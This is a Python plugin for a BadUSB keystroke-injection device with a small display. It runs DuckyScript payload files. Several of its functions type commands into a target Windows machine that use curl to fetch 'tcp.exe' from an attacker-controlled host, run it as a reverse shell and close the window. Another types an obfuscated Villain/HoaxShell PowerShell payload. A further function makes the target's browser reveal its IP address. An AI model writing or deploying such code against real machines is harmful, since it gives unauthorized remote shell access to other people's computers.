from PIL import ImageFont
from time import sleep
from core.badusb.badusb import BadUSB, DuckyScriptInterpreter
from core.SH1106.screen import menu, fullClear, usbRunPercentage, waitForKey
import os

# reverse shell stuff
import socket
from core.webserver.https import *
from random import randint
from threading import Thread
import core.villain.villan_core as vil

class vars:

    config = { 
        # you can have this in an external file, aslong as main file gets it in dictionary format
        # this is for your command help n stuff
        "payloads": "run payloads in ./plugins/payloads folder",
        "percentageTest": "asdijaweu9ihf78ewrgf79",
        "pullIP": "get the local ip of a computer by starting an HTTP server, and making the client connect to it through browser",
        "windowsHoaxShell": "use villain's payload generator and type it out, executing it"
    }

    payloadList = {}

    font = ImageFont.truetype('core/fonts/roboto.ttf', 11)

def payloads(args:list):
    # args: [draw, disp, image]

    draw, disp, image, GPIO= args[0], args[1], args[2], args[3]

    payloads = os.listdir("./plugins/payloads/")
    for file in payloads:
        with open("./plugins/payloads/{}".format(file), "r") as f:
            vars.payloadList[file] = f.read().strip().split("\n")
        
    

    vars.payloadList["back"] = '0'

    sleep(0.5)

    a = menu(draw, disp, image, list(vars.payloadList), GPIO, font=vars.font, onlyPrefix=False)

    if a == "back":
        return

    if a == None:
        return

    usb = BadUSB()

    handler = usbRunPercentage(draw,disp,image) # init handler
    Thread(target=handler.start,daemon=True).start() # start handler

    handler.setPercentage(0)

    for ln in vars.payloadList[a]:
        if len(ln) == 0: continue
        if ln[0] == "#": continue

        currIndex = vars.payloadList[a].index(ln)

        # this is painful
        handler.setPercentage(
            round(100 - float(
                str( # turn decimal percentage into a string
                    "{:.0%}".format(
                        currIndex/len(
                            vars.payloadList[a] # make decimal percentage
                        )
                    )
                ).replace("%", "") # remove percentage sign
            ) # turn string back into float
            ) # round it up
        ) # set percentage

        line = ln.split(" ")
        base = line[0]
        line.pop(0)

        dsi = DuckyScriptInterpreter(usb)

        if base in dsi.key:
            dsi.key[base](line)

        if base == "PRINT": # print to display
            handler.addText(' '.join(line))

    fullClear(draw)

    draw.text((10, 10), "finished!", fill=0, outline=255, font=vars.font)

    disp.ShowImage(disp.getbuffer(image))

    waitForKey(GPIO)

def shellPayload(args:list):
    draw, disp, image, GPIO= args[0], args[1], args[2], args[3]

    ipType = None

    ipRange = ["select ip num"]
    ipRange += range(1, 254)
    ipRange.append("back")
    ipCompiled = []

    while True:
        ipCompiled.clear()
        for _ in range(4):
            num = menu(draw, disp, image, list(ipRange), font=vars.font, onlyPrefix=False)

            if num == "back":
                return

            if num == "select ip num":
                continue

            if num == None:
                return
            else:
                ipCompiled.append(num)

        ipCompiled = '.'.join(ipCompiled)

        isChoice = menu(draw, disp, image, ['{} is correct?'.format(ipCompiled), "yes", "no"], font=vars.font, onlyPrefix=False)

        if isChoice == "yes":
            break
        else:
            continue

    usb = BadUSB()

    fullClear(draw)

    draw.text((10, 10), "runnning...", fill=0, outline=255, font=vars.font)

    disp.ShowImage(disp.getbuffer(image))

    usb.write("curl http://{}:8000/tcp.exe -o tcp.exe".format(ipCompiled))
    usb.press("ENTER")

    sleep(1)

    usb.write("tcp.exe")
    usb.press("ENTER")

    sleep(2.5)

    usb.write("exit")
    usb.press("ENTER")

    fullClear(draw)

    draw.text((10, 10), "finished!", fill=0, outline=255, font=vars.font)

    disp.ShowImage(disp.getbuffer(image))

    waitForKey(GPIO)

    return

def windowsNgrokShell(args:list):
    draw, disp, image, GPIO= args[0], args[1], args[2], args[3]

    handler = usbRunPercentage(draw,disp,image) # init handler
    Thread(target=handler.start,daemon=True).start() # start handler

    handler.setPercentage(0)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); sock.connect(("1.1.1.1", 80)) # make socket and connect to 1.1.1.1 to get local ip
    local = sock.getsockname()[0] # pull local ip from sockname
    sock.close() # close the socket

    handler.setPercentage(10)

    httpAddress = (local, randint(4000, 50000)) # set our addresses

    handler.setPercentage(20)

    handler.addText("IP: {}:{}".format(httpAddress[0], httpAddress[1]))

    handler.setPercentage(30)

    httpServer = HTTPServer(port=httpAddress[1]) # set http server as variable

    handler.setPercentage(40)

    httpServer.forever() # launch our http server
    handler.addText("started http server")
    usb = BadUSB() # init usb handler

    # we will assume cmd is already open

    handler.setPercentage(50)

    handler.addText("curl-ing http server")
    usb.write("curl http://{}:{}/tcp.exe -o tcp.exe".format(httpServer[0], httpServer[1])) # curl our server for tcp shell
    usb.press("ENTER") # run

    handler.setPercentage(60)

    sleep(1) # wait for curl to finish

    handler.setPercentage(70)

    handler.addText("running exe")
    usb.write("tcp.exe") # run shell
    usb.press("ENTER")

    handler.setPercentage(80)

    sleep(2.5) # wait

    handler.setPercentage(90)

    handler.addText("exiting")
    usb.write("exit") # exit right after, should run in background
    usb.press("ENTER")

    handler.setPercentage(100)

    fullClear(draw)

    handler.addText("finished")

    waitForKey(GPIO)

    return

def windowsHoaxShell(args:list):
    draw, disp, image, GPIO= args[0], args[1], args[2], args[3]

    handler = usbRunPercentage(draw,disp,image) # init handler
    Thread(target=handler.start,daemon=True).start() # start handler
    usb = BadUSB() # init usb handler
    payload = vil.payloadGen("windows", "wlan0")

    handler.setPercentage(0)

    handler.addText("executing payload")
    # we will assume ps is already open
    usb.write(payload.scrambled) # curl our server for tcp shell
    usb.press("ENTER") # run

    sleep(0.5) # wait for cmd to finish

    usb.write("exit") # exit right after, should run in background
    usb.press("ENTER")

    handler.setPercentage(100)

    fullClear(draw)

    handler.addText("finished")

    waitForKey(GPIO)

    return

def percentageTest(args:list):
    draw, disp, image, GPIO= args[0], args[1], args[2], args[3]

    handler = usbRunPercentage(draw,disp,image)

    Thread(target=handler.start,daemon=True).start()

    #for x in range(101):
        #handler.percentage = x
        #sleep(0.05)

    handler.text = 'lorem ipsump i dont know the rest aawawiojaiouwj'

    #handler.text = "123456789abcde\n"*24

    sleep(30)

    handler.exit()

def pullIP(args:list):
    draw, disp, image, GPIO= args[0], args[1], args[2], args[3]

    port = randint(2500,30000)

    handler = usbRunPercentage(draw,disp,image)
    Thread(target=handler.start,daemon=True).start()
    handler.clearText()

    handler.addText("starting fake tcp-http")

    #httpHandler = HTTPServer(port=port) # init the http server
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); sock.connect(("1.1.1.1", 80)) # make socket and connect to 1.1.1.1 to get local ip
    local = sock.getsockname()[0] # pull local ip from sockname
    sock.close() # close the socket

    #httpHandler.forever() # start it
    #Thread(target=httpHandler.forever, daemon=True).start() # start it

    fakeHTTP = FakeHTTPServer(bindto=(local, port))

    handler.addText("started fake tcp-http")
    handler.addText("@{}:{}".format(local,port))
    #handler.addText("make sure chrome is open and is focused on the search (1s)")

    try:
        usb = BadUSB()
    except Exception as e:
        handler.addText("couldn't open usb")
        handler.exit()
        fakeHTTP.tcp.close()
        print(e)
        return

    sleep(1)

    try:
        usb.ctrl("t") # new tab auto focuses
        usb.write("http://{}:{}/".format(local,port)) # http url
        sleep(0.25) # lil wait
        usb.press("ENTER") # enter
    except:
        handler.addText("couldn't type")
        handler.exit()
        fakeHTTP.tcp.close()
        return

    handler.addText("waiting... (5s timeout)")
    sleep(0.5) # lil wait

    try:
        client = fakeHTTP.waitFor()[1][1]
        handler.text = "I:{}\nP:{}".format(client[0], client[1]) # best formatting ever
    except Exception as e:
        print(e)
        handler.addText(str(e))

    usb.ctrl("w") # close tab
    sleep(0.25) # wait for host machine to process
    usb.ctrl("w") # twice

    usb.close()
    fakeHTTP.tcp.close()

    waitForKey(GPIO)
    sleep(0.125) # button rebound
    handler.text = "1:{0}\n2:{1}\n3:{2}\n4:{3}".format(*client[0].split(".")) # best formatting ever 2
    waitForKey(GPIO)

    handler.exit()



def ask(string):
    """
    an example of an unexecutable function
    """

    return input(string)

def functions():
    """
    put your executable functions here and your configuration
    """
    return vars.config